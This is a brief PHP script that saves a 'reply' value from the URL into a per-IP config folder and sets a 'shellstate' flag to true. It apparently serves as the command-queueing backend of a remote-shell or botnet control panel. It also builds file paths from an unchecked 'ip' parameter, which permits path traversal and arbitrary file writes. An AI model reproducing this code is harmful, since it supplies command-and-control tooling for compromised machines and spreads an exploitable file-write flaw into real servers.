<?php

$reply1 = $_GET["reply"];
$reply = utf8_encode($reply1);
$Ip = $_GET["ip"];
$ConfigFile = fopen("config/".$Ip."/replyconfig.cir","w+");

fwrite($ConfigFile,$reply);
fclose($ConfigFile);
$ConfigFile_2 = fopen("config/".$Ip."/shellstate.cir","w+");
fwrite($ConfigFile_2,"true");
fclose($ConfigFile_2);

?>